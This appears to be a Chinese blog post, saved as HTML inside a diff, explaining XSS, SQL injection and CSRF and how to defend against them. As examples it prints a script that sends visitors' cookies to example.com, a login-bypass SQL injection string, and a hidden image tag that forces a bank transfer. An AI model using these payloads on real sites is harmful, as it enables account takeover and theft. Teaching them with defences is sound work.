@@ -1,0 +1,344 @@
+<!doctype html>
+
+<html lang="en">
+
+<head>
+  <title>Web 常见的三个安全问题 - 蛮荆</title>
+  <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="description" content="" />
+<meta name="author" content="" />
+<link rel="shortcut icon" href="https://dbwu.tech/favicon.ico" type="image/x-icon" /><meta property="og:title" content="Web 常见的三个安全问题" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dbwu.tech/posts/web_security/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-07-05T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-07-05T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Web 常见的三个安全问题"/>
+<meta name="twitter:description" content=""/>
+
+<meta name="generator" content="Hugo 0.113.0">
+    
+    <script src="https://dbwu.tech/js/mathjax-config.js" defer></script>
+    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+    <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-CZMGTTFLNY"></script>
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3261056100776781" crossorigin="anonymous"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-CZMGTTFLNY');
+  </script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js" integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js" integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
+        onload="renderMathInElement(document.body);"></script>
+
+
+  <link rel="stylesheet" href="https://dbwu.tech/fontawesome/css/normalize.min.css" />
+  <link rel="stylesheet" href="https://dbwu.tech/fontawesome/css/all.min.css" />
+  
+    
+    <link href="//fonts.googleapis.com/css?family=Staatliches" rel="stylesheet">
+  
+  
+  <link rel="stylesheet" type="text/css" href="https://dbwu.tech/css/styles-light.css" />
+  </head>
+
+<body>
+  <div id="container">
+    <header>
+      
+      <h1>
+        <a href="https://dbwu.tech/">蛮荆</a>
+      </h1>
+
+      <ul id="social-media">
+      </ul>
+      
+    </header>
+
+    
+<nav>
+    <ul>
+        
+        <li>
+            <a class="active" href="https://dbwu.tech/posts/">
+                <i class="fa-li fa  fa-lg"></i><span>归档</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="https://dbwu.tech/tags/">
+                <i class="fa-li fa  fa-lg"></i><span>标签</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="https://github.com/duanbiaowu">
+                <i class="fa-li fa  fa-lg"></i><span>Github</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="https://dbwu.tech/index.xml">
+                <i class="fa-li fa  fa-lg"></i><span>RSS</span>
+            </a>
+        </li>
+        
+    </ul>
+</nav>
+
+
+    <main>
+
+
+
+
+<article>
+
+    <h1>Web 常见的三个安全问题</h1>
+
+    
+      
+<li>
+    
+    
+    <a href="https://dbwu.tech/tags/web-%E5%AE%89%E5%85%A8">Web 安全</a>
+    
+</li>
+
+    
+
+    
+      
+
+    
+
+    <h2 id="概述">概述</h2>
+<p>这两天在看 <a href="https://book.douban.com/subject/26875239/">Google SRE 这本书</a>, 书中提到了几种常见的安全问题:</p>
+<p><img src="https://dbwu.tech/images/google_sre_web_security.png" alt="图片来源: Google Site Reliability Engineering"></p>
+<p>本文着重讲一下其中的 <code>XSS</code>、 <code>SQL 注入</code>、<code>CSRF</code>，这三个问题也是 Web 开发中常见的。</p>
+<h2 id="跨站脚本攻击">跨站脚本攻击</h2>
+<p><strong>跨站脚本攻击</strong>（Cross-Site Scripting, XSS）: 攻击者通过在网页中插入恶意代码来利用浏览器的漏洞，代码包括 HTML 和 JavaScript。</p>
+<h3 id="攻击原理">攻击原理</h3>
+<p>例如有一个论坛网站，攻击者可以在上面发布以下内容：</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#6ab825;font-weight:bold">script</span>&gt;location.href=<span style="color:#ed9d13">&#34;//example.com/?c=&#34;</span> + <span style="color:#24909d">document</span>.cookie&lt;/<span style="color:#6ab825;font-weight:bold">script</span>&gt;
+</span></span></code></pre></div><p>如果服务端没有对该内容进行安全过滤，那么发布后内容会被渲染成以下形式：</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#6ab825;font-weight:bold">p</span>&gt;&lt;<span style="color:#6ab825;font-weight:bold">script</span>&gt;location.href=<span style="color:#ed9d13">&#34;//example.com/?c=&#34;</span> + <span style="color:#24909d">document</span>.cookie&lt;/<span style="color:#6ab825;font-weight:bold">script</span>&gt;&lt;/<span style="color:#6ab825;font-weight:bold">p</span>&gt;
+</span></span></code></pre></div><p>此时另一个用户浏览了含有这个内容的页面，将会跳转到 example.com 并携带了自己的的 Cookie, 如果这个论坛网站恰好通过 Cookie 的方式来管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录当前用户的账号了。</p>
+<h3 id="攻击目的">攻击目的</h3>
+<ul>
+<li>窃取用户的 Cookie</li>
+<li>伪造虚假的输入表单窃取用户信息</li>
+<li>显示伪造的文章或者图片</li>
+<li>使用被攻击者的身份执行一些操作，如: 发通告、加好友、发私信等</li>
+<li>通过在访问量大的网站放置 XSS 代码来攻击小型网站</li>
+</ul>
+<h3 id="真实案例">真实案例</h3>
+<p>笔者在职业生涯早期，曾经遇到过一个真实的跨站脚本攻击案例。当时的背景是开发了一个类似 SAAS 的投票模块，因为每个客户会根据最终的投票结果排名发放对应的奖品，
+有个懂技术的用户在个人昵称中添加了一段 js 代码，服务端没有做响应的过滤，造成的结果就是该用户霸榜第一名连续将近 6 小时，后来是业务方反馈到了笔者这边，进行了紧急处理。</p>
+<h3 id="如何防护">如何防护</h3>
+<h4 id="1-设置-cookie-为-httponly">1. 设置 Cookie 为 HttpOnly</h4>
+<p>通过将 Cookie 的 HttpOnly 属性设置为 true, 表示无法通过 document.cookie 获取用户 Cookie 信息，可以在一定程度上防止 JavaScript 代码类型的跨站脚本攻击。</p>
+<h4 id="2-过滤特殊字符">2. 过滤特殊字符</h4>
+<blockquote>
+<p>不相信用户的任何输入。</p>
+</blockquote>
+<p>例如将 <code>&lt;</code> 转义为 <code>&amp;lt;</code>，将 <code>&gt;</code> 转义为 <code>&amp;gt;</code>，从而避免 HTML 和 Jascript 代码的运行。</p>
+<p>富文本编辑器允许用户输入 HTML 代码，通常采用自定义标签的方式，过滤掉可能会造成攻击性 HTML 代码。例如下面的例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#6ab825;font-weight:bold">h1</span> <span style="color:#bbb">id</span>=<span style="color:#ed9d13">&#34;title&#34;</span>&gt;XSS Demo&lt;/<span style="color:#6ab825;font-weight:bold">h1</span>&gt;&lt;<span style="color:#6ab825;font-weight:bold">p</span>&gt;123&lt;/<span style="color:#6ab825;font-weight:bold">p</span>&gt;&lt;<span style="color:#6ab825;font-weight:bold">form</span>&gt;&lt;<span style="color:#6ab825;font-weight:bold">input</span> <span style="color:#bbb">type</span>=<span style="color:#ed9d13">&#34;text&#34;</span> <span style="color:#bbb">name</span>=<span style="color:#ed9d13">&#34;q&#34;</span> <span style="color:#bbb">value</span>=<span style="color:#ed9d13">&#34;test&#34;</span>&gt;&lt;/<span style="color:#6ab825;font-weight:bold">form</span>&gt;&lt;<span style="color:#6ab825;font-weight:bold">pre</span>&gt;hello&lt;/<span style="color:#6ab825;font-weight:bold">pre</span>&gt;&lt;<span style="color:#6ab825;font-weight:bold">script</span> <span style="color:#bbb">type</span>=<span style="color:#ed9d13">&#34;text/javascript&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>alert(<span style="color:#ed9d13">/xss/</span>);
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#6ab825;font-weight:bold">script</span>&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#6ab825;font-weight:bold">h1</span>&gt;XSS Demo&lt;/<span style="color:#6ab825;font-weight:bold">h1</span>&gt;&lt;<span style="color:#6ab825;font-weight:bold">p</span>&gt;123&lt;/<span style="color:#6ab825;font-weight:bold">p</span>&gt;&amp;lt;form&amp;gt;
+</span></span><span style="display:flex;"><span>  &amp;lt;input type=&#34;text&#34; name=&#34;q&#34; value=&#34;test&#34;&amp;gt;
+</span></span><span style="display:flex;"><span>&amp;lt;/form&amp;gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#6ab825;font-weight:bold">pre</span>&gt;hello&lt;/<span style="color:#6ab825;font-weight:bold">pre</span>&gt;&amp;lt;script type=&#34;text/javascript&#34;&amp;gt;
+</span></span><span style="display:flex;"><span>alert(/xss/);
+</span></span><span style="display:flex;"><span>&amp;lt;/script&amp;gt;
+</span></span></code></pre></div><h3 id="在线测试工具">在线测试工具</h3>
+<p><a href="https://pentest-tools.com/website-vulnerability-scanning/xss-scanner-online">XSS Scanner - Online Scan for Cross-site Scripting</a></p>
+<p>可以选择单个页面测试，也可以整站测试。</p>
+<h2 id="sql-注入攻击">SQL 注入攻击</h2>
+<p><strong>SQL 注入攻击</strong> 是指攻击者在应用程序的数据库查询中注入恶意 SQL 代码，从而执行未经授权的 SQL 语句，造成 SQL 注入的原因是服务端程序没有过滤客户端提交的数据。</p>
+<h3 id="攻击原理-1">攻击原理</h3>
+<p>例如一个网站登录验证的 SQL 查询代码为：</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">sql</span><span style="color:#666"> </span>=<span style="color:#666"> </span><span style="color:#ed9d13">&#34;SELECT * FROM users WHERE (name = &#39;&#34;</span><span style="color:#666"> </span>+<span style="color:#666"> </span>userName<span style="color:#666"> </span>+<span style="color:#666"> </span><span style="color:#ed9d13">&#34;&#39;) and (pw = &#39;&#34;</span>+<span style="color:#666"> </span>passWord<span style="color:#666"> </span>+<span style="color:#ed9d13">&#34;&#39;);&#34;</span><span style="color:#666">
+</span></span></span></code></pre></div><p>如果填入以下内容：</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>userName<span style="color:#666"> </span>=<span style="color:#666"> </span><span style="color:#ed9d13">&#34;1&#39; OR &#39;1&#39;=&#39;1&#34;</span>;<span style="color:#666">
+</span></span></span><span style="display:flex;"><span><span style="color:#666"></span>passWord<span style="color:#666"> </span>=<span style="color:#666"> </span><span style="color:#ed9d13">&#34;1&#39; OR &#39;1&#39;=&#39;1&#34;</span>;<span style="color:#666">
+</span></span></span></code></pre></div><p>那么 SQL 查询字符串就会变为：</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">sql</span><span style="color:#666"> </span>=<span style="color:#666"> </span><span style="color:#ed9d13">&#34;SELECT * FROM users WHERE (name = &#39;1&#39; OR &#39;1&#39;=&#39;1&#39;) and (pw = &#39;1&#39; OR &#39;1&#39;=&#39;1&#39;);&#34;</span><span style="color:#666">
+</span></span></span></code></pre></div><p>等于直接跳过数据库管理员执行了以下查询 (俗称 “脱库”):</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">sql</span><span style="color:#666"> </span>=<span style="color:#666"> </span><span style="color:#ed9d13">&#34;SELECT * FROM users;&#34;</span><span style="color:#666">
+</span></span></span></code></pre></div><p>其他 SQL 注入方式和上面的示例类似，都是攻击者通过先猜测对应的服务端 SQL 语句，然后再根据请求数据格式注入对应的代码，读者可以展开 “想象”，充当一回 Hacker, 对自己的项目全面地进行一个 SQL 注入安全检查。</p>
+<h3 id="如何防护-1">如何防护</h3>
+<h4 id="1-使用参数化查询">1. 使用参数化查询</h4>
+<p>主流编程语言的标准库、第三方 ORM 框架基本都已经内置了 SQL 参数查询过滤功能，例如 GORM 的写法:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span>result := db.<span style="color:#447fcf">Where</span>(<span style="color:#ed9d13">&#34;username = ?&#34;</span>, username).<span style="color:#447fcf">First</span>(&amp;user)
+</span></span></code></pre></div><h4 id="2-单引号转换">2. 单引号转换</h4>
+<p>将传入的参数中的特殊字符 (如单引号, 双引号, 反斜杠等) 进行转义处理，这样被转移的 SQL 语句执行就会报错，但是在实际开发中，
+这种方法很少使用，一般都是使用第一种方法。</p>
+<h3 id="在线测试工具-1">在线测试工具</h3>
+<p><a href="https://pentest-tools.com/website-vulnerability-scanning/sql-injection-scanner-online">XSS Scanner - Online Scan for Cross-site Scripting</a></p>
+<h2 id="跨站请求伪造">跨站请求伪造</h2>
+<p><strong>跨站请求伪造</strong>（Cross-site request forgery，CSRF）是攻击者诱使用户去访问一个已登陆的网站，并执行一些特定操作（如发邮件、发消息、转账等）。</p>
+<blockquote>
+<p>跨站脚本攻击利用的是用户对指定网站的信任，跨站请求伪造攻击利用的是网站对浏览器的信任。</p>
+</blockquote>
+<h3 id="攻击原理-2">攻击原理</h3>
+<p>假如一家银行用以执行转账操作的 URL 地址如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>http://www.examplebank.com/withdraw?account=AccoutName<span style="color:#a61717;background-color:#e3d2d2">&amp;</span>amount=1000<span style="color:#a61717;background-color:#e3d2d2">&amp;</span>for=PayeeName
+</span></span></code></pre></div><p>那么，一个恶意攻击者可以在一个网站 A 上放置如下代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#6ab825;font-weight:bold">img</span> <span style="color:#bbb">src</span>=<span style="color:#ed9d13">&#34;http://www.examplebank.com/withdraw?account=小明&amp;amount=1000&amp;for=攻击者&#34;</span>&gt;。
+</span></span></code></pre></div><p>如果此时有账户名为 小明 的用户访问了网站 A，而他之前刚登陆过银行网站，那么他就会向攻击者转账 1000 元，而他本人还蒙在鼓里尚不知情。</p>
+<p>上面的攻击方式是最简单的一种，类似这种恶意的网址可以有很多种形式，藏身于网页中的各个角落 (如按钮、图片、对话框等)，
+同时，攻击者可以将恶意代码放到其他网站中，例如他可以将代码藏在论坛，博客等任何用户生成内容的网站中,
+如果这些被攻击者放置代码的网站服务端没有进行安全过滤，所有访问这些网站的用户都有可能受到攻击，损失金钱。</p>
+<blockquote>
+<p>攻击者并不能通过 跨站请求伪造攻击 来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。本质上，攻击者是通过欺骗用户浏览器来执行特定操作。</p>
+</blockquote>
+<h3 id="防范手段">防范手段</h3>
+<h4 id="1-检查-referer-首部字段">1. 检查 Referer 首部字段</h4>
+<p>Referer 首部字段位于 HTTP Header 报文中，用于标识请求的源地址，通过检查这个首部字段，并且要求 请求源地址 和 当前地址 必须在同一个域名下，可以尽可能的防止跨站请求伪造攻击。</p>
+<p>该方案实现简单并且效果不错，但是局限性在于其完全依赖浏览器发送的 Referer 字段百分百是正确的，
+如果浏览器的内核实现有问题，或者浏览器本身有安全漏洞，都会影响到该字段的正确发送，甚至攻击者可以直接攻击浏览器，强制篡改 Referer 字段值。</p>
+<h4 id="限制请求方式">限制请求方式</h4>
+<p>一般情况下，攻击者放置在网站上面的代码，用户点击时都是 GET 请求方式，对于关键操作，可以限制请求方式为 POST、PUT 等，也算一种非常简单实用的防止攻击的方案。</p>
+<h4 id="3-双重身份验证">3. 双重身份验证</h4>
+<p>跨站请求伪造攻击是在用户无意识的情况下发生的，此时可以通过二次验证机制来提醒用户接下来的操作，常见的验证方式有短信验证码、手机令牌、电话密钥等。</p>
+<h4 id="4-添加校验-token">4. 添加校验 Token</h4>
+<blockquote>
+<p>异或计算性质: 三个值中的任意两个值进行异或计算，都可以得出第三个值。</p>
+</blockquote>
+<p>示例代码: 数字 1, 2, 3 执行异或计算</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">package</span> main
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">func</span> <span style="color:#447fcf">main</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#24909d">println</span>(<span style="color:#3677a9">1</span> ^ <span style="color:#3677a9">2</span>) <span style="color:#999;font-style:italic">// 3
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>	<span style="color:#24909d">println</span>(<span style="color:#3677a9">3</span> ^ <span style="color:#3677a9">1</span>) <span style="color:#999;font-style:italic">// 2
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>	<span style="color:#24909d">println</span>(<span style="color:#3677a9">3</span> ^ <span style="color:#3677a9">2</span>) <span style="color:#999;font-style:italic">// 1
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>}
+</span></span></code></pre></div><p><img src="https://dbwu.tech/images/web_token_xor.png" alt="利用异或计算性质返回一个 Token"></p>
+<p>在发送关键数据请求时，服务端可以生成一个 Token 返回给客户端，客户端保存在表单中，并在请求时携带该 Token 和数据一起发送到服务端。</p>
+<p><strong>Token 工作流程</strong>:</p>
+<ol>
+<li>服务端获取到 <strong>持久性密钥</strong> (这个密钥一般是该服务专属并且全局唯一，可能存储在数据库、缓存、配置中心等)</li>
+<li>根据客户端当前请求生成一个 <strong>随机字符串 A</strong></li>
+<li>通过计算 (持久性密钥 XOR 随机字符串A) 得出 Token</li>
+<li>将 Token 返回到客户端</li>
+<li>客户端接收到 Token 后保存起来，可以是表单、Cookie 等方式</li>
+<li>客户端再次发起请求时，携带该 Token</li>
+<li>通过计算 (持久性密钥 XOR 客户端 Token) 得出 <strong>随机字符串B</strong></li>
+<li>比较 <strong>随机字符串 A</strong> 和 <strong>随机字符串 B</strong> 是否相等，如果不相等，说明请求被篡改</li>
+</ol>
+<h2 id="其他安全问题">其他安全问题</h2>
+<h3 id="鉴权不当和访问控制不当">鉴权不当和访问控制不当</h3>
+<p>确保实现正确的用户校验授权以及操作权限管理，Go 语言可以参考这两个组件 <a href="https://github.com/casbin/casbin">casbin/casbin</a>, <a href="https://github.com/golang-jwt/jwt">golang-jwt/jwt</a>。</p>
+<h3 id="敏感信息泄漏">敏感信息泄漏</h3>
+<p>采用足够安全的方案保存密码，Go 语言可以参考标准库中的 <a href="https://github.com/golang/crypto/blob/master/scrypt/example_test.go">/crypto/scrypt</a>。</p>
+<h3 id="不安全的文件上传">不安全的文件上传</h3>
+<p>服务端没有对上传文件的类型、大小和内容进行验证和过滤，可能会导致恶意文件的上传和执行 (例如攻击者上传恶意 shell、php 文件)，
+对用户上传的任何文件都要进行检测，此外也可以直接使用云服务商提供的 OSS 安全检测功能。</p>
+<h3 id="日志记录和监控不足">日志记录和监控不足</h3>
+<ol>
+<li>全面记录日志：确保对关键事件和操作进行全面记录，包括用户登录、权限变更、敏感数据访问等</li>
+<li>合理设置日志级别</li>
+<li>及时备份日志文件</li>
+<li>搭建实时监控和警报系统</li>
+</ol>
+<h2 id="文章声明">文章声明</h2>
+<p>Web 安全测试是一项专业且敏感的活动，需要掌握专业知识和遵守法律法规，本文所有内容仅作为技术描述和演示，错误的使用安全测试技术可能导致违法行为、侵犯隐私、数据泄露等问题。
+读者务必确保在合适和合法的环境中进行实践和学习，引起的任何后果请读者自负，本文作者概不负责。</p>
+<h2 id="扩展阅读">扩展阅读</h2>
+<ul>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection">Testing for SQL Injection</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Cross-site_scripting">Cross-site scripting</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Cross-site_request_forgery">Cross-site request forgery</a></li>
+<li><a href="https://en.wikipedia.org/wiki/SQL_injection">SQL injection</a></li>
+</ul>
+
+
+</article>
+
+<article>
+    <img src="https://dbwu.tech/images/wechat.png">
+</article>
+
+<article>
+    <h3>转载申请</h3>
+
+    <p>
+        本作品采用 <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a> 进行许可，转载时请注明原文链接，图片在使用时请保留全部内容，商业转载请联系作者获得授权。
+    </p>
+</article>
+
+<section class="post-nav">
+    <ul>
+        <li>
+        
+            <a href="https://dbwu.tech/posts/golang_ants/"><i class="fa fa-chevron-circle-left"></i> ants Code Reading</a>
+        
+        </li>
+        <li>
+        
+            <a href="https://dbwu.tech/posts/golang_fastcache/">fastcache 高性能设计与实现 <i class="fa fa-chevron-circle-right"></i> </a>
+        
+        </li>
+    </ul>
+</section>
+  
+    
+    
+  
+
+
+<script src="https://giscus.app/client.js"
+        data-repo="duanbiaowu/dbwu.tech"
+        data-repo-id="R_kgDOIkkjjw"
+        data-category="Announcements"
+        data-category-id="DIC_kwDOIkkjj84CV78j"
+        data-mapping="specific"
+        data-term="Web 常见的三个安全问题"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="1"
+        data-input-position="top"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous" async>
+</script>
+
+
+
+
+</main>
+    <footer>
+        <ul>
+            <li>
+                <h6><a href="mailto:codean.net@gmail.com">codean.net@gmail.com</a> | 
+                    <img src="https://dbwu.tech/images/%E5%A4%87%E6%A1%88%E5%9B%BE%E6%A0%87.png" />
+                    <a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=61011302001681" target="_blank">陕公网安备 61011302001681 号</a> |
+                    <a href="https://beian.miit.gov.cn" target="_blank">陕ICP备2023004378号-1</a> |
+                    Rendered by <a href="https://themes.gohugo.io" title="Hugo" target="_blank">Hugo</a>
+                </h6>
+            </li>
+            
+            
+        </ul>
+    </footer>
+</div>
+<script src="https://dbwu.tech/js/scripts.js"></script>
+
+
+</body>
+
+</html>
+
